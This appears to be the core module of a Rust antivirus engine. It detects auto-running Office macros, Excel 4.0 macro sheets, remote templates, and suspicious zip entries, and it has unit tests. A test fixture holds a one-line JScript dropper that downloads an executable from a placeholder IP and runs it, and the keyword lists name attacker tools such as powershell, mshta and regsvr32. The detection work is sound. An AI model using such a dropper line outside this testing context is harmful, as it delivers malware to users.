//! Genra AV core: reads a file, extracts what rules match on, and returns a verdict.
//! It never runs the file's code, never writes to it, and never sends it anywhere.

pub mod clean;
pub mod extract;
pub mod heur;
pub mod ovba;
pub mod paths;
pub mod quarantine;
pub mod reputation;
pub mod rules;
pub mod scanner;
pub mod targets;

use extract::{Kind, VbaModule};
use rules::{Pack, Severity};
use serde::Serialize;
use sha2::{Digest, Sha256};

#[derive(Debug, Serialize)]
pub struct Finding {
    pub rule: String,
    pub family: String,
    pub severity: Severity,
    pub message_vi: String,
    /// English, when the rule carries it (`None`: show `message_vi`).
    pub message_en: Option<String>,
    /// Whether this finding on its own may move the file into quarantine. False for a match on
    /// a public hash feed that is not marked `trusted` (anyone can upload a clean file there).
    pub auto_quarantine: bool,
}

#[derive(Debug, Serialize)]
pub struct Report {
    pub sha256: String,
    pub kind: Kind,
    pub vba_modules: Vec<VbaModule>,
    pub findings: Vec<Finding>,
    /// Highest severity found; `None` means nothing to report.
    pub verdict: Option<Severity>,
    /// The file's hash is on the pack's allow list, so rule matches were dropped.
    pub allowed: bool,
}

impl Report {
    /// True when a rule, a built-in heuristic or a trusted hash list says malware. A hit on an
    /// untrusted hash feed alone never quarantines.
    pub fn should_quarantine(&self) -> bool {
        self.findings.iter().any(|f| f.severity == Severity::Malware && f.auto_quarantine)
    }
}

/// Macro entry points that run without the user asking (Office runs them on open/close).
const AUTO_EXEC: &[&str] = &[
    "auto_open", "auto_close", "autoopen", "autoclose", "autoexec", "workbook_open",
    "workbook_beforeclose", "document_open", "document_close", "presentation_open",
];
/// Calls that reach outside the document: other programs, the network, other files.
const REACHES_OUT: &[&str] = &[
    "shell", "createobject", "urldownloadtofile", "powershell", "wscript", "mshta", "regsvr32",
    "savecopyas", "startuppath", "xlstart", "onsheetactivate", "vbproject", "codemodule", "kill ",
];

/// Version of the built-in checks. Part of the scan cache's fingerprint: raising it makes every
/// cached "clean" verdict be checked again with the new checks.
pub const ENGINE: u32 = 2;

/// Most entries looked at inside one plain zip, and how deep archives inside archives are opened.
const ZIP_ENTRIES: usize = 2_000;
const ZIP_DEPTH: usize = 2;
/// Extensions that run code: an encrypted zip holding one cannot be checked and is a common trick.
const PROGRAM_EXT: &[&str] = &["exe", "scr", "com", "pif", "cpl", "dll", "js", "jse", "vbs", "vbe", "wsf", "hta", "ps1", "bat", "cmd", "lnk", "msi", "jar", "iso", "img"];

/// [`scan_with`] plus the checks that need the file's name: disguised names, scripts and shortcuts
/// by type, and what is inside a plain zip (each entry scanned the same way, a few levels deep).
pub fn scan_named(name: &str, bytes: &[u8], pack: Option<&Pack>, reputation: Option<&reputation::Reputation>) -> Report {
    scan_named_at(name, bytes, pack, reputation, 0)
}

fn scan_named_at(name: &str, bytes: &[u8], pack: Option<&Pack>, reputation: Option<&reputation::Reputation>, depth: usize) -> Report {
    let mut report = scan_with(bytes, pack, reputation);
    if report.allowed {
        return report;
    }
    let mut extra = heur::name_findings(name);
    extra.extend(heur::script_findings(name, bytes));
    extra.extend(heur::url_findings(name, bytes));
    extra.extend(heur::lnk_findings(bytes));
    if report.kind == extract::Kind::Zip && !extract::is_office_package(bytes) {
        extra.extend(zip_findings(bytes, pack, reputation, depth));
    }
    report.findings.extend(extra);
    report.verdict = report.findings.iter().map(|f| f.severity).max();
    report
}

/// Scans each entry of a plain zip (not an Office file) and reports what it finds as
/// `<rule>@zip` with the entry's name. Uses the Office reader's zip checks and budget, so a zip
/// bomb or a crafted archive costs a bounded amount of work.
fn zip_findings(bytes: &[u8], pack: Option<&Pack>, reputation: Option<&reputation::Reputation>, depth: usize) -> Vec<Finding> {
    let mut out = Vec::new();
    let Ok(entries) = extract::zip_entries(bytes, ZIP_ENTRIES) else { return out };
    for e in entries {
        let ext = e.name.rsplit_once('.').map(|(_, x)| x.to_ascii_lowercase()).unwrap_or_default();
        if e.encrypted {
            if PROGRAM_EXT.contains(&ext.as_str()) {
                out.push(Finding {
                    rule: "builtin.zip_locked_program".into(),
                    family: "archive".into(),
                    severity: Severity::Suspicious,
                    message_vi: format!("Tệp nén có mật khẩu chứa chương trình ({}): cách hay dùng để mã độc lọt qua kiểm tra.", e.name),
                    message_en: Some(format!("A password-protected archive holds a program ({}): a common way to slip malware past checks.", e.name)),
                    auto_quarantine: false,
                });
            }
            continue;
        }
        let Some(data) = e.data else { continue };
        // An archive inside this one is opened only while the next level is within the limit.
        if depth + 1 >= ZIP_DEPTH && extract::kind(&data) == extract::Kind::Zip {
            continue;
        }
        let inner = scan_named_at(&e.name, &data, pack, reputation, depth + 1);
        for f in inner.findings.into_iter().filter(|f| f.severity >= Severity::Suspicious) {
            out.push(Finding {
                rule: if f.rule.ends_with("@zip") { f.rule } else { format!("{}@zip", f.rule) },
                family: f.family,
                severity: f.severity,
                message_vi: format!("Trong tệp nén có {}: {}", e.name, f.message_vi),
                message_en: f.message_en.map(|m| format!("Inside the archive, {}: {m}", e.name)),
                auto_quarantine: f.auto_quarantine,
            });
        }
    }
    out
}

pub fn scan(bytes: &[u8], pack: Option<&Pack>) -> Report {
    scan_with(bytes, pack, None)
}

/// Like [`scan`], and also looks the file's hash up in the pack's hash lists.
pub fn scan_with(bytes: &[u8], pack: Option<&Pack>, reputation: Option<&reputation::Reputation>) -> Report {
    let sha256 = hex::encode(Sha256::digest(bytes));
    let kind = extract::kind(bytes);
    let facts = extract::facts(bytes);
    let mut findings = Vec::new();

    if let Some(pack) = pack {
        for rule in pack.rules.iter().filter(|r| !pack.disabled.contains(&r.id)) {
            if matches(rule, &sha256, &facts.vba) {
                findings.push(Finding {
                    rule: rule.id.clone(),
                    family: rule.family.clone(),
                    severity: rule.severity,
                    message_vi: rule.message_vi.clone(),
                    message_en: rule.message_en.clone(),
                    auto_quarantine: true,
                });
            }
        }
    }
    if let Some(hit) = reputation.and_then(|r| r.lookup(&sha256)) {
        findings.push(Finding {
            rule: format!("hash.{}", hit.file.trim_end_matches(".bin")),
            family: hit.family.clone(),
            severity: hit.severity,
            message_vi: format!("Tệp này khớp với mã độc đã biết ({}).", hit.source),
            message_en: Some(format!("This file matches known malware ({}).", hit.source)),
            auto_quarantine: hit.trusted,
        });
    }
    findings.extend(builtin(&facts));

    let allowed = pack.is_some_and(|p| p.allow_sha256.iter().any(|h| h.eq_ignore_ascii_case(&sha256)));
    if allowed {
        findings.clear();
    }
    let verdict = findings.iter().map(|f| f.severity).max();
    Report { sha256, kind, vba_modules: facts.vba, findings, verdict, allowed }
}

fn matches(rule: &rules::Rule, sha256: &str, vba: &[VbaModule]) -> bool {
    let w = &rule.when;
    let any_set = !w.sha256_any.is_empty()
        || !w.vba_module_name_any.is_empty()
        || !w.vba_source_all.is_empty()
        || !w.vba_source_any.is_empty();
    if !any_set {
        return false;
    }
    if !w.sha256_any.is_empty() && !w.sha256_any.iter().any(|h| h.eq_ignore_ascii_case(sha256)) {
        return false;
    }
    if !w.vba_module_name_any.is_empty()
        && !vba.iter().any(|m| w.vba_module_name_any.iter().any(|n| n.eq_ignore_ascii_case(&m.name)))
    {
        return false;
    }
    let lowered: Vec<String> = vba.iter().map(|m| m.source.to_ascii_lowercase()).collect();
    if !w.vba_source_all.is_empty()
        && !lowered.iter().any(|src| w.vba_source_all.iter().all(|s| src.contains(&s.to_ascii_lowercase())))
    {
        return false;
    }
    if !w.vba_source_any.is_empty()
        && !lowered.iter().any(|src| w.vba_source_any.iter().any(|s| src.contains(&s.to_ascii_lowercase())))
    {
        return false;
    }
    true
}

/// Heuristics that work with no pack at all, so a fresh install is never blind to macros.
fn builtin(facts: &extract::Facts) -> Vec<Finding> {
    let mut out = Vec::new();
    if facts.vba_unreadable {
        out.push(Finding {
            rule: "builtin.vba_unreadable".into(),
            family: "macro".into(),
            severity: Severity::Suspicious,
            message_vi: "Tệp có macro nhưng không đọc được mã: không nên mở bằng Excel/Word.".into(),
            message_en: Some("The file has macros whose code cannot be read: do not open it in Excel or Word.".into()),
            auto_quarantine: true,
        });
    }
    // An Auto_Open name alone runs nothing: report XLM only when there is a macro sheet, or the
    // name sits beside VBA it would start.
    let sheets = facts.xlm.iter().any(|x| x.starts_with("Excel 4.0 macro sheet"));
    if sheets || (!facts.xlm.is_empty() && !facts.vba.is_empty()) {
        let runs = facts.xlm.iter().any(|x| x.contains("runs a macro"));
        out.push(Finding {
            rule: if runs { "builtin.xlm_autorun" } else { "builtin.xlm_macro" }.into(),
            family: "macro".into(),
            severity: Severity::Suspicious,
            message_vi: if runs {
                "Tệp có macro Excel 4.0 tự chạy khi mở: kiểu macro cũ mà phần mềm độc hại hay dùng để né quét."
            } else {
                "Tệp có trang macro Excel 4.0: kiểu macro cũ mà phần mềm độc hại hay dùng để né quét."
            }
            .into(),
            message_en: Some(
                if runs {
                    "The file has Excel 4.0 macros that run when it opens: an old macro type malware uses to avoid scanners."
                } else {
                    "The file has an Excel 4.0 macro sheet: an old macro type malware uses to avoid scanners."
                }
                .into(),
            ),
            auto_quarantine: true,
        });
    }
    if facts.workbook_encrypted {
        out.push(Finding {
            rule: "builtin.workbook_encrypted".into(),
            family: "macro".into(),
            severity: Severity::Info,
            message_vi: "Tệp Excel có mật khẩu nên Genra không kiểm được macro Excel 4.0 bên trong.".into(),
            message_en: Some("The Excel file is password-protected, so Genra cannot check it for Excel 4.0 macros.".into()),
            auto_quarantine: false,
        });
    }
    if !facts.remote_templates.is_empty() {
        out.push(Finding {
            rule: "builtin.remote_template".into(),
            family: "remote_template".into(),
            severity: Severity::Suspicious,
            message_vi: "Tệp tự tải nội dung từ ngoài máy khi mở: cách hay dùng để kéo mã độc về.".into(),
            message_en: Some("The file loads content from outside the computer when it opens: a common way to pull in malware.".into()),
            auto_quarantine: true,
        });
    }
    if facts.vba.is_empty() {
        return out;
    }
    let all: String = facts.vba.iter().map(|m| m.source.to_ascii_lowercase()).collect::<Vec<_>>().join("\n");
    let auto = AUTO_EXEC.iter().any(|k| all.contains(k));
    let reach = REACHES_OUT.iter().any(|k| all.contains(k));
    let (rule, severity, msg, msg_en) = match (auto, reach) {
        (true, true) => (
            "builtin.macro_autoexec_reaches_out",
            Severity::Suspicious,
            "Macro tự chạy khi mở tệp và can thiệp ra ngoài tệp (chép tệp, chạy chương trình…).",
            "A macro runs when the file opens and reaches outside the file (copies files, runs programs…).",
        ),
        _ => ("builtin.macro_present", Severity::Info, "Tệp có macro VBA.", "The file has VBA macros."),
    };
    out.push(Finding {
        rule: rule.into(),
        family: "macro".into(),
        severity,
        message_vi: msg.into(),
        message_en: Some(msg_en.into()),
        auto_quarantine: true,
    });
    out
}

#[cfg(test)]
mod archive_tests {
    use super::*;
    use crate::extract::tests::{vba_project_bin, zip_of};

    fn rules(r: &Report) -> Vec<String> {
        r.findings.iter().filter(|f| f.severity >= Severity::Suspicious).map(|f| f.rule.clone()).collect()
    }

    const DROPPER: &[u8] = br#"var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","http://203.0.113.9/a.exe");WScript.CreateObject("WScript.Shell").Run("a.exe");"#;

    #[test]
    fn scripts_and_disguises_inside_a_zip_are_reported_with_the_entry() {
        let z = zip_of(&[("hoa-don/Hoa don thang 11.js", DROPPER), ("doc.txt", b"hello")]);
        let r = scan_named("hoa-don.zip", &z, None, None);
        assert_eq!(rules(&r), ["builtin.script_download_run@zip"]);
        assert!(r.findings[0].message_vi.contains("Hoa don thang 11.js"));
        let z = zip_of(&[("Bao cao.pdf.exe", b"MZ")]);
        assert_eq!(rules(&scan_named("bao-cao.zip", &z, None, None)), ["builtin.name_double_extension@zip"]);
    }

    #[test]
    fn archives_inside_archives_stop_at_the_depth_limit() {
        let inner = zip_of(&[("a.js", DROPPER)]);
        let mid = zip_of(&[("inner.zip", &inner)]);
        let outer = zip_of(&[("mid.zip", &mid)]);
        assert_eq!(rules(&scan_named("o.zip", &mid, None, None)), ["builtin.script_download_run@zip"], "two levels are opened");
        assert!(rules(&scan_named("o.zip", &outer, None, None)).is_empty(), "the third level is not");
    }

    #[test]
    fn a_password_protected_zip_holding_a_program_is_suspicious() {
        // A zip whose entry has the "encrypted" flag set in both headers, as a password zip has.
        let mut z = zip_of(&[("setup.exe", b"MZ....")]);
        for sig in [&b"PK\x03\x04"[..], &b"PK\x01\x02"[..]] {
            let at = memchr::memmem::find(&z, sig).unwrap() + if sig[2] == 3 { 6 } else { 8 };
            z[at] |= 1;
        }
        assert_eq!(rules(&scan_named("tai-lieu.zip", &z, None, None)), ["builtin.zip_locked_program"]);
    }

    #[test]
    fn office_files_are_not_opened_as_archives_and_clean_zips_stay_clean() {
        let docm = zip_of(&[("[Content_Types].xml", b"<Types/>"), ("word/vbaProject.bin", &vba_project_bin())]);
        let r = scan_named("bao-cao.docm", &docm, None, None);
        assert!(!rules(&r).iter().any(|x| x.ends_with("@zip")), "{:?}", rules(&r));
        let z = zip_of(&[("Bao cao.docx", b"PK not really"), ("anh.jpg", b"\xff\xd8"), ("setup.exe", b"MZ")]);
        assert!(rules(&scan_named("tai-lieu.zip", &z, None, None)).is_empty());
    }
}
